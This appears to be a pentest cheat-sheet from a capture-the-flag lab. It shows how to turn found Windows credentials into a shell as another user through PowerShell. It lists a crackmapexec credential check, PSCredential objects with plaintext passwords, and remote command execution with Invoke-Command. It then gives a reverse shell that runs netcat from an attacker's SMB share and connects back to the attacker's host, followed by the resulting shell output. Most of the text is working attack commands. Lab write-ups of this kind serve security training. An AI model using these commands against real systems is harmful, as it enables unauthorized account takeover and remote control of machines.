
when we found credentials of an user account in PS, we can utilize the following methodology to get shell as this user.

---

First of all let's confirm that those creds are working, utilizing crackmapexec

```
crackmapexec smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM'
```

## Creating Credential Object and logging into different user

```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```
```
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

Logging in

```
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```



## Create Credential Object

```
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
```

## Command Execution

Running the following command prompted us with an working command.

```
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
sniper\chris
```

## RCE

Started up listener on port 8888

```
nc -lvnp 8888
```

Assuming you have an running smb server on your local machine, with an netcat binary inside it.

```
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { \\10.10.14.239\htb\nc.exe -e cmd.exe 10.10.14.239 8888 } -credential $credential;
```

Gained RCE as user "Chris".

```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.239] from (UNKNOWN) [10.129.229.6] 49873
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>whoami
whoami
sniper\chris
```